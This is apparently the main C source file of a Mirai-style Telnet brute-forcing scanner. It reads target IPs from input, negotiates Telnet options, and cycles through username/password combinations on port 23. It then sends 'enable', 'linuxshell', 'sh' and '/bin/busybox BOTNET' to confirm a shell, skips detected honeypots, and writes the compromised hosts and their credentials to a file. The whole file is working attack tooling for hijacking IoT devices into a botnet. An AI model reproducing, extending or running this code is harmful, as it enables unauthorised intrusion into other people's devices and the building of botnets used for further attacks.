#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/epoll.h>

#include "headers/main.h"
#include "headers/dead.h"
#include "headers/resp.h"
#include "headers/queue.h"
#include "headers/combos.h"
#include "headers/connection.h"
#include "headers/honeypot.h"

volatile int processed = 0, failed = 0, processing = 0, found = 0, honeypots = 0, maxfds = 0, last_found = 0, left_in_queue = 0, thread = 0;

void remove_newline(char *string)
{
    int len = strlen(string);

    while(len--)
    {
        if(string[len] == '\r' || string[len] == '\n')
            string[len] = 0;
    }
}

void control_epoll(int fd, int op, uint32_t events)
{
    struct epoll_event ev = {events, .data.fd = fd};
    epoll_ctl(epfd, EPOLL_CTL_ADD, fd, &ev);
}

void *writer_init()
{
    int seconds = 0;

    while(1)
    {
        printf("%ds, Processed: %d, Processing: %d, Failed: %d, Found: %d, Honeypots: %d, Queued: %d, Last Find: %ds ago\n",
            ATOMIC_INC(&seconds), ATOMIC_GET(&processed), ATOMIC_GET(&processing) > 0 ? ATOMIC_GET(&processing) : 0, ATOMIC_GET(&failed), ATOMIC_GET(&found), ATOMIC_GET(&honeypots), ATOMIC_GET(&left_in_queue), ATOMIC_GET(&found) > 0 ? ATOMIC_INC(&last_found) : 0);
        sleep(1);
    }
}

void write_to_file(Brute *brute, char *file)
{
    FILE *fp;

    fp = fopen(file, "a");
    fprintf(fp, "%s:23 %s:%s\n", brute->address, brute->auth->username, brute->auth->password);
    fclose(fp);
}

void sockprintf(int fd, char *format, ...)
{
    int len;
    char *buffer;
    va_list args;

    va_start(args, format);

    len = vasprintf(&buffer, format, args);
    va_end(args);

    send(fd, buffer, len, MSG_NOSIGNAL);
    free(buffer);
}

static char can_consume(Brute *brute, uint8_t *ptr, int amount)
{
    uint8_t *end = (uint8_t *)brute->rdbuf + brute->rdbuf_pos;

    return ptr + amount < end;
}

static int consume_iacs(Brute *brute)
{
    int consumed = 0;
    uint8_t *ptr = (uint8_t *)brute->rdbuf;

    while (consumed < brute->rdbuf_pos)
    {
        int i;

        if (*ptr != 0xff)
            break;
        else if (*ptr == 0xff)
        {
            if (!can_consume(brute, ptr, 1))
                break;
            if (ptr[1] == 0xff)
            {
                ptr += 2;
                consumed += 2;
                continue;
            }
            else if (ptr[1] == 0xfd)
            {
                uint8_t tmp1[3] = {255, 251, 31};
                uint8_t tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};

                if (!can_consume(brute, ptr, 2))
                    break;
                if (ptr[2] != 31)
                    goto iac_wont;

                ptr += 3;
                consumed += 3;

                send(brute->fd, tmp1, 3, MSG_NOSIGNAL);
                send(brute->fd, tmp2, 9, MSG_NOSIGNAL);
            }
            else
            {
                iac_wont:

                if (!can_consume(brute, ptr, 2))
                    break;

                for (i = 0; i < 3; i++)
                {
                    if (ptr[i] == 0xfd)
                        ptr[i] = 0xfc;
                    else if (ptr[i] == 0xfb)
                        ptr[i] = 0xfd;
                }

                send(brute->fd, ptr, 3, MSG_NOSIGNAL);
                ptr += 3;
                consumed += 3;
            }
        }
    }

    return consumed;
}

void *epoll_thread()
{
    int nfds, fd, ret, fake_time;
    struct epoll_event *events = calloc(MAX_CONS, sizeof(struct epoll_event));

    while(1)
    {
        nfds = epoll_wait(epfd, events, MAX_CONS, 1);
        fake_time = time(0);

        for(int i = 0; i < nfds; i++)
        {
            fd = events[i].data.fd;

            if(events[i].events & EPOLLOUT)
                check_connection(fd, fake_time);
            
            else if(events[i].events & (EPOLLIN | EPOLLET))
            {
                Brute *brute = &bruter[fd];
                brute->fd = fd;

                if(brute->tries >= cindex)
                {
                    disconnect(brute);
                    continue;
                }

                if(brute->rdbuf_pos == RDBUF_SIZE)
                {
                    brute->rdbuf_pos = 0;
                    memset(brute->rdbuf, 0, RDBUF_SIZE);
                }

                brute->auth = &combos[brute->tries];
                if((ret = recv(fd, brute->rdbuf + brute->rdbuf_pos, RDBUF_SIZE - brute->rdbuf_pos, MSG_NOSIGNAL)) == 0 || strlen(brute->address) == 0)
                {
                    disconnect(brute);
                    continue;
                }

                brute->rdbuf_pos += ret;
                brute->last_recv = fake_time;
#ifdef DEBUGBUFFER
                printf("%s\n", brute->rdbuf);
#endif
                switch(brute->stage)
                {
                case BR_IACS:
                    consume_iacs(brute);

                    brute->rdbuf_pos = 0;
                    memset(brute->rdbuf, 0, RDBUF_SIZE);
#ifdef DEBUG
                    printf("Completed IAC negotiation with %s:23, fd: %d\n", brute->address, brute->fd);
#endif
                    brute->stage = BR_USERNAME;
                    break;
                case BR_USERNAME:
                    if(check_login_resp(brute))
                    {
#ifdef DEBUG
                        printf("Sending Username %s to %s:23, fd: %d\n", brute->auth->username, brute->address, brute->fd);
#endif  
                        sockprintf(fd, "%s\r\n", brute->auth->username);
                        brute->stage = BR_PASSWORD;
                    }
                    break;
                case BR_PASSWORD:
                    if(check_login_resp(brute))
                    {
#ifdef DEBUG    
                        printf("Sending Password %s to %s:23, fd: %d\n", brute->auth->username, brute->address, brute->fd);
#endif  
                        sockprintf(fd, "%s\r\n", brute->auth->password);
                        brute->stage = BR_SEND_ENABLE;
                    }
                    break;
                case BR_SEND_ENABLE:
                    sockprintf(fd, "enable\r\n");

                    brute->stage = BR_SEND_LSHELL;
                    break;
                case BR_SEND_LSHELL:
                    sockprintf(fd, "linuxshell\r\n");

                    brute->stage = BR_SEND_SYSTEM;
                    break;
                case BR_SEND_SYSTEM:
                    sockprintf(fd, "system\r\n");

                    brute->stage = BR_SEND_SH;
                    break;
                case BR_SEND_SH:
                    sockprintf(fd, "sh\r\n");

                    brute->stage = BR_SEND_BUSYBOX;
                    break;
                case BR_SEND_BUSYBOX:
                    sockprintf(fd, "ls /home; /bin/busybox BOTNET\r\n");

                    brute->stage = BR_WAITING_TOKEN_RESP;
                    break;
                case BR_WAITING_TOKEN_RESP:
                    if(check_password_resp(brute) == 0)
                    {
#ifdef DEBUG
                        printf("Invalid Password Retrying: %s:23, %s:%s, fd: %d\n", brute->address, brute->auth->username, brute->auth->password, brute->fd);
#endif
                        ATOMIC_INC(&failed);
                        if(++brute->tries < cindex)
                            start_connection(NULL, brute);
                        disconnect(brute);
                        break;
                    }

                    else if(check_honeypot(brute))
                    {
                        printf("Honeypot Found %s:23 %s %s\n", brute->address, brute->auth->username, brute->auth->password);

                        write_to_file(brute, "honeypots.txt");
                        ATOMIC_INC(&honeypots);
                        disconnect(brute);
                        break;
                    }

                    else if(strstr(brute->rdbuf, "applet not found"))
                    {
                        printf("Found Deivce %s:23 %s:%s\n", brute->address, brute->auth->username, brute->auth->password);

                        write_to_file(brute, "bruted.txt");
                        ATOMIC_INC(&found);
                        disconnect(brute);
                        last_found = 0;
                        break;
                    }
                    break;
                }
            }
            else
            {
                control_epoll(fd, EPOLL_CTL_DEL, EPOLLIN | EPOLLET);
                close(fd);
            }
        }
    }
}

int _read(int fd, char *buffer, int buffersize)
{
    int total = 0, got = 1;
    while(got == 1 && total < buffersize && *(buffer + total - 1) != '\n') 
    {
        got = read(fd, buffer + total, 1);
        total++;
    }
    return got;
}

int main(int argc, char **argv)
{
    if(argc != 2) 
    {
        printf("Error Invalid Amount of Arguements\nExample: %s 1\n", argv[0]);
        exit(0);
    }

    char rdbuf[16];
    int threads = atoi(argv[1]);
    pthread_t rec[threads], thread_writer[3];

    tport = htons(23);
    epfd = epoll_create1(0);
    bruter = calloc(MAX_CONS, sizeof(Brute));
    queue = calloc(999999, sizeof(Queue));

    combos_init();

    pthread_mutex_init(&mutex, NULL);
    pthread_create(&thread_writer[0], NULL, &writer_init, NULL);
    pthread_create(&thread_writer[1], NULL, &watch_time, NULL);
    pthread_create(&thread_writer[2], NULL, &handle_queued, NULL); // handle_queued()

    pthread_create(&rec[0], NULL, &epoll_thread, NULL);

    while(1)
    {
        memset(rdbuf, 0, 16);
        if(fgets(rdbuf, 16, stdin) == NULL)
            break;
        remove_newline(rdbuf);

        if(strlen(rdbuf))
        {
            if(processing < ACTUAL_MAX_CONS)
                start_connection(rdbuf, NULL);
            else
                bruter_queue_ip(rdbuf);

            ATOMIC_INC(&processed);
        }
    }

    for(int i = 1; i < threads; i++)
        pthread_create(&rec[i], NULL, &epoll_thread, NULL);

    printf("Finished Reading\n");

    while(1)
        sleep(1);
    return 0;
}
